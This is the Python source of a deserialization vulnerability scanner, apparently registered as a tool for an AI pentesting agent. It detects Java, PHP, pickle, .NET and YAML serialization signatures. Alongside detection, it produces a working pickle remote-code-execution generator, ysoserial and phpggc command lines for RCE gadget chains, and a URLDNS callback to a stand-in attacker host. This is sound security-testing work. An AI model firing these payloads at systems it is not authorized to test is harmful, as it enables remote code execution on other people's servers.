"""Deserialization vulnerability scanner for web application security."""

from __future__ import annotations

import base64
import re
from typing import Any, Literal

import requests

from strix.tools.registry import register_tool
from strix.tools.validation import (
    generate_usage_hint,
    validate_action_param,
    validate_required_param,
    validate_unknown_params,
)


DeserializationAction = Literal["detect", "generate_java", "generate_php", "generate_python", "analyze"]

# Detection signatures for serialized data
SERIALIZATION_SIGNATURES = {
    "java": {
        "binary": [b"\xac\xed\x00\x05", b"rO0AB"],  # Magic bytes and base64
        "patterns": [r"rO0AB[A-Za-z0-9+/=]+", r"H4sIA[A-Za-z0-9+/=]+"],  # Base64 Java, GZIP+Java
    },
    "php": {
        "patterns": [
            r'O:\d+:"[^"]+":',  # Object serialization
            r'a:\d+:{',  # Array serialization
            r's:\d+:"[^"]*";',  # String serialization
        ],
    },
    "python_pickle": {
        "binary": [b"\x80\x04\x95", b"(dp0"],  # Pickle protocol markers
        "patterns": [r"gASV[A-Za-z0-9+/=]+", r"KGRw[A-Za-z0-9+/=]+"],  # Base64 pickle
    },
    "dotnet": {
        "patterns": [
            r"AAEAAAD/////",  # .NET BinaryFormatter
            r"<[^>]*ViewState[^>]*>",  # ViewState
        ],
    },
    "yaml": {
        "patterns": [
            r"!!python/object",
            r"!!ruby/object",
            r"!ruby/hash",
        ],
    },
}

# Java gadget chains (ysoserial)
JAVA_GADGETS = {
    "CommonsCollections1": {
        "description": "Apache Commons Collections <= 3.2.1",
        "detection": "org.apache.commons.collections",
    },
    "CommonsCollections2": {
        "description": "Apache Commons Collections4 <= 4.0",
        "detection": "org.apache.commons.collections4",
    },
    "CommonsBeanutils1": {
        "description": "Apache Commons Beanutils",
        "detection": "org.apache.commons.beanutils",
    },
    "Jdk7u21": {
        "description": "JDK 7u21 (AnnotationInvocationHandler)",
        "detection": "sun.reflect.annotation",
    },
    "Spring1": {
        "description": "Spring Framework <= 4.2.x",
        "detection": "org.springframework",
    },
}


def _detect_serialization(
    url: str,
    method: str = "GET",
    timeout: int = 10,
) -> dict[str, Any]:
    """Detect potential deserialization endpoints."""
    results: dict[str, Any] = {
        "url": url,
        "detected_formats": [],
        "potential_endpoints": [],
        "risk_level": "LOW",
    }

    try:
        response = requests.request(method, url, timeout=timeout)

        # Check response for serialization signatures
        content = response.text
        content_bytes = response.content

        for format_name, signatures in SERIALIZATION_SIGNATURES.items():
            # Check binary signatures
            if "binary" in signatures:
                for sig in signatures["binary"]:
                    if sig in content_bytes:
                        results["detected_formats"].append({
                            "format": format_name,
                            "signature_type": "binary",
                            "indicator": sig[:20].hex() if isinstance(sig, bytes) else sig,
                        })
                        results["risk_level"] = "HIGH"

            # Check pattern signatures
            if "patterns" in signatures:
                for pattern in signatures["patterns"]:
                    if re.search(pattern, content):
                        results["detected_formats"].append({
                            "format": format_name,
                            "signature_type": "pattern",
                            "pattern": pattern,
                        })
                        results["risk_level"] = "HIGH"

        # Check for common deserialization parameters
        deser_params = ["data", "object", "payload", "viewstate", "session", "state", "token"]
        if "?" in url:
            for param in deser_params:
                if param.lower() in url.lower():
                    results["potential_endpoints"].append({
                        "parameter": param,
                        "url": url,
                    })

        # Check headers for serialization hints
        content_type = response.headers.get("Content-Type", "")
        if any(ct in content_type.lower() for ct in ["java", "octet-stream", "serialized"]):
            results["content_type_hint"] = content_type
            results["risk_level"] = "MEDIUM"

    except requests.exceptions.RequestException as e:
        results["error"] = str(e)

    if results["detected_formats"]:
        results["recommendations"] = [
            "Avoid deserializing untrusted data",
            "Use safe serialization formats like JSON",
            "Implement integrity checks on serialized data",
            "Use look-ahead deserialization filters (Java)",
        ]

    return results


def _generate_java_payloads(
    command: str = "id",
    gadget: str = "all",
) -> dict[str, Any]:
    """Generate Java deserialization payload information."""
    results: dict[str, Any] = {
        "command": command,
        "payloads": {},
    }

    if gadget == "all":
        gadgets_to_use = JAVA_GADGETS
    elif gadget in JAVA_GADGETS:
        gadgets_to_use = {gadget: JAVA_GADGETS[gadget]}
    else:
        return {"error": f"Unknown gadget: {gadget}", "available_gadgets": list(JAVA_GADGETS.keys())}

    for gadget_name, info in gadgets_to_use.items():
        results["payloads"][gadget_name] = {
            "description": info["description"],
            "detection_class": info["detection"],
            "ysoserial_command": f"java -jar ysoserial.jar {gadget_name} '{command}'",
            "usage_note": "Generate with ysoserial tool, encode as base64 for transmission",
        }

    # Add generic detection payloads
    results["detection_payloads"] = {
        "dns_exfil": f"java -jar ysoserial.jar URLDNS 'http://test.attacker.com'",
        "sleep": "Use JRMPClient gadget with delayed response server",
    }

    results["encoding_tips"] = [
        "Base64 encode for URL/JSON transmission",
        "GZIP compression may be required",
        "Consider URL encoding for query parameters",
    ]

    return results


def _generate_php_payloads(
    command: str = "id",
) -> dict[str, Any]:
    """Generate PHP object injection payload information."""
    results: dict[str, Any] = {
        "command": command,
        "payloads": {},
    }

    # Common PHP gadget chains
    results["payloads"]["generic_rce"] = {
        "pattern": 'O:8:"stdClass":1:{s:4:"test";s:2:"id";}',
        "description": "Generic object injection template",
        "note": "Modify class name and properties based on target application",
    }

    results["payloads"]["laravel"] = {
        "pattern": 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":...',
        "description": "Laravel framework gadget chain",
        "tool": "phpggc Laravel/RCE1-10",
    }

    results["payloads"]["symfony"] = {
        "pattern": 'O:47:"Symfony\\Component\\Cache\\Adapter\\FilesystemAdapter":...',
        "description": "Symfony framework gadget chain",
        "tool": "phpggc Symfony/RCE1-4",
    }

    results["payloads"]["wordpress"] = {
        "pattern": 'O:8:"WP_Theme":...',
        "description": "WordPress gadget chain (if vulnerable plugin)",
        "tool": "phpggc WordPress/RCE1",
    }

    results["tools"] = {
        "phpggc": "https://github.com/ambionics/phpggc",
        "command": f"phpggc -u Laravel/RCE1 system '{command}'",
    }

    results["detection_tips"] = [
        "Look for unserialize() calls with user input",
        "Check for __wakeup() and __destruct() methods",
        "Monitor for 'unserialize(): Error' in responses",
    ]

    return results


def _generate_python_payloads(
    command: str = "id",
) -> dict[str, Any]:
    """Generate Python pickle deserialization payload information."""
    results: dict[str, Any] = {
        "command": command,
        "payloads": {},
    }

    # Simple pickle payload (for demonstration)
    pickle_payload_code = f'''
import pickle
import base64

class RCE:
    def __reduce__(self):
        import os
        return (os.system, ('{command}',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
'''

    results["payloads"]["basic_rce"] = {
        "generator_code": pickle_payload_code,
        "description": "Basic pickle RCE payload using __reduce__",
        "usage": "Execute generator code to create base64-encoded payload",
    }

    results["payloads"]["subprocess"] = {
        "description": "Payload using subprocess module",
        "note": "import subprocess; subprocess.call(['/bin/bash', '-c', 'command'])",
    }

    results["detection_payloads"] = {
        "dns_callback": "Use dnsbin/interactsh for out-of-band detection",
        "time_delay": "import time; time.sleep(5) for blind detection",
    }

    results["tools"] = {
        "fickling": "https://github.com/trailofbits/fickling - Pickle security analysis",
    }

    results["detection_tips"] = [
        "Look for pickle.loads() with user input",
        "Check for yaml.load() without safe_load",
        "Monitor for PicklingError or UnpicklingError",
    ]

    return results


def _analyze_serialized_data(
    data: str,
) -> dict[str, Any]:
    """Analyze a serialized data string to identify format."""
    results: dict[str, Any] = {
        "input_length": len(data),
        "detected_format": "unknown",
        "analysis": {},
    }

    # Try base64 decode
    try:
        decoded = base64.b64decode(data)
        results["base64_decoded"] = True
        results["decoded_length"] = len(decoded)

        # Check for Java magic bytes
        if decoded.startswith(b"\xac\xed"):
            results["detected_format"] = "java_serialized"
            results["analysis"]["magic_bytes"] = "AC ED (Java ObjectOutputStream)"

        # Check for Python pickle
        elif decoded.startswith(b"\x80\x04") or decoded.startswith(b"\x80\x03"):
            results["detected_format"] = "python_pickle"
            results["analysis"]["protocol"] = "Pickle protocol 3 or 4"

    except Exception:
        results["base64_decoded"] = False

    # Check for PHP serialization
    if re.match(r'^[OasidbN]:\d+:', data):
        results["detected_format"] = "php_serialized"
        if data.startswith("O:"):
            match = re.match(r'O:(\d+):"([^"]+)":', data)
            if match:
                results["analysis"]["object_class"] = match.group(2)
                results["analysis"]["class_name_length"] = match.group(1)

    # Check for .NET ViewState
    if data.startswith("/wE") or "AAEAAAD" in data:
        results["detected_format"] = "dotnet_viewstate"

    # Risk assessment
    if results["detected_format"] != "unknown":
        results["risk_level"] = "HIGH"
        results["recommendation"] = f"Test with {results['detected_format']} gadget chains"

    return results


@register_tool
def deserialization_scanner(
    action: DeserializationAction,
    url: str | None = None,
    data: str | None = None,
    command: str = "id",
    gadget: str = "all",
    method: str = "GET",
    timeout: int = 10,
    **kwargs: Any,
) -> dict[str, Any]:
    """Scan for deserialization vulnerabilities.

    Deserialization vulnerabilities occur when untrusted data is deserialized,
    potentially leading to remote code execution.

    Args:
        action: The scanning action:
            - detect: Detect potential deserialization endpoints
            - generate_java: Generate Java deserialization payload info
            - generate_php: Generate PHP object injection payload info
            - generate_python: Generate Python pickle payload info
            - analyze: Analyze serialized data to identify format
        url: Target URL for detection
        data: Serialized data string to analyze
        command: Command for payload generation
        gadget: Java gadget chain (all, CommonsCollections1, etc.)
        method: HTTP method for detection
        timeout: Request timeout

    Returns:
        Deserialization scan results with vulnerability indicators
    """
    VALID_PARAMS = {"action", "url", "data", "command", "gadget", "method", "timeout"}
    VALID_ACTIONS = ["detect", "generate_java", "generate_php", "generate_python", "analyze"]

    unknown_error = validate_unknown_params(kwargs, VALID_PARAMS, "deserialization_scanner")
    if unknown_error:
        unknown_error.update(generate_usage_hint("deserialization_scanner", "detect", {"url": "https://example.com/api"}))
        return unknown_error

    action_error = validate_action_param(action, VALID_ACTIONS, "deserialization_scanner")
    if action_error:
        return action_error

    try:
        if action == "detect":
            url_error = validate_required_param(url, "url", action, "deserialization_scanner")
            if url_error:
                return url_error
            return _detect_serialization(url, method, timeout)

        if action == "generate_java":
            return _generate_java_payloads(command, gadget)

        if action == "generate_php":
            return _generate_php_payloads(command)

        if action == "generate_python":
            return _generate_python_payloads(command)

        if action == "analyze":
            if not data:
                return {"error": "data is required for analyze action"}
            return _analyze_serialized_data(data)

        return {"error": f"Unknown action: {action}"}

    except Exception as e:
        return {"error": f"Deserialization scanning failed: {e!s}"}
